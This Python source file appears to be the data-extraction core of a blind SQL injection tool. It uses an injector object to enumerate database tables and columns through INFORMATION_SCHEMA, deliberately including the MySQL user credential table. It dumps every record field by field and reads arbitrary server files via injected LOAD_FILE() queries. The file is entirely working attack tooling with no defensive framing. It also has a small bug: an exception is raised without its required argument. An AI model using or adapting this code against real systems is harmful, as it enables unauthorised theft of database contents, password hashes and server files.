import math


class TableInfo:

    def __init__(self, name, schema):
        self.name = name
        self.schema = schema
        self.columns = []
        self.records = []


class Database:

    table_filter = "table_schema != 'INFORMATION_SCHEMA' AND (table_schema != 'mysql' OR table_name = 'user') AND table_schema != 'PERFORMANCE_SCHEMA'"
    tables_table = TableInfo('tables', 'INFORMATION_SCHEMA')

    def __init__(self, injector, tableExecutor, recordExecutor, printer):
        self.injector = injector
        self.tableExecutor = tableExecutor
        self.recordExecutor = recordExecutor
        self.printer = printer
        self.tables = []

    def getTableCount(self):
        return self.injector.getCount(self.tables_table, self.table_filter)

    def getTableName(self, tableIndex):
        return self.injector.getDataFromTable('table_name', Database.tables_table, tableIndex, self.table_filter)

    def getTableSchema(self, tableIndex):
        return self.injector.getDataFromTable('table_schema', Database.tables_table, tableIndex, self.table_filter)

    def getTable(self, index, populateTable=False):
        self.printer.print("Getting name of table %d" % index, 2)
        name = self.getTableName(index)
        self.printer.print("Got table name: %s" % name, 2)
        schema = self.getTableSchema(index)
        self.printer.print("Got table schema: %s" % schema, 2)
        if populateTable:
            self.printer.print("Building table: %s (schema: %s)" % (name, schema), 1)
            table = Table(self.injector, name, schema, self.recordExecutor, self.printer)
            table.populate()
            return table
        else:
            table = TableInfo(name, schema)
            return table
        
    def findTables(self, populateTables=False):
        self.printer.print("Getting table count...", 1)
        count = self.getTableCount()
        self.printer.print("Counted %d tables" % count, 1)
        self.tables.extend(list(self.tableExecutor.map(lambda x: self.getTable(x, populateTables), range(count))))


class Table(TableInfo):

    columns_table = TableInfo('columns', 'INFORMATION_SCHEMA')

    def __init__(self, injector, name, schema, recordExecutor, printer):
        super().__init__(name, schema)
        self.injector = injector
        self.column_filter = "table_name = '%s'" % self.name
        if self.schema is not None:
            self.column_filter += " AND table_schema = '%s'" % self.schema
        self.recordExecutor = recordExecutor
        self.printer = printer

    def verify(self):
        return self.injector.getCount(Database.tables_table, self.column_filter) > 0

    def populate(self, where=None):
        self.findColumns()
        self.printer.print("", 1)
        self.findRecords(where)

    def getColumnCount(self):
        return self.injector.getCount(Table.columns_table, self.column_filter)

    def getColumnName(self, columnIndex):
        return self.injector.getDataFromTable('column_name', Table.columns_table, columnIndex, self.column_filter)

    def getColumn(self, index):
        name = self.getColumnName(index)
        self.printer.print("Got column name: %s" % name, 1, 1)
        return name

    def findColumns(self):
        self.printer.print("Getting column count...", 1, 1)
        count = self.getColumnCount()
        self.printer.print("Found %d columns" % count, 1, 1)
        self.columns.extend(list(self.recordExecutor.map(self.getColumn, range(count))))


    def getRecordCount(self, where=None):
        return self.injector.getCount(self, where)

    def getRecordData(self, recordIndex, column, where=None):
        return self.injector.getDataFromTable(column, self, recordIndex, where)

    def getField(self, column, index, where):
        data = self.getRecordData(index, column, where)
        self.printer.print("Found value '%s'=>'%s' for record %d" % (column, data, index), 1, 2)
        self.records[index].setData(column, data)

    def findRecords(self, where=None):
        self.printer.print("Getting record count...", 1, 1)
        count = self.getRecordCount(where)
        self.printer.print("Found %d records" % count, 1, 1)
        self.records = [Record(self) for x in range(count)]
        numcols = len(self.columns)
        fieldcount = count*numcols
        list(self.recordExecutor.map(lambda x: self.getField(self.columns[x%numcols], math.floor(x/numcols), where), range(fieldcount)))



class Record:

    def __init__(self, table):
        self.table = table
        self.data = {}

    def setData(self, column, data):
        if column in self.table.columns:
            self.data[column] = data





class FileReadError(Exception):

    def __init__(self, filename):
        self.filename = filename


class File:

    def __init__(self, injector, filename):
        self.injector = injector
        self.filename = filename
        self.test()
        self.read()

    def test(self):
        if self.injector.checkBit("LOAD_FILE('%s') IS NULL" % self.filename):
            raise FileReadError

    def read(self):
        self.contents = self.injector.getString("LOAD_FILE('%s')" % self.filename)
        return self.contents
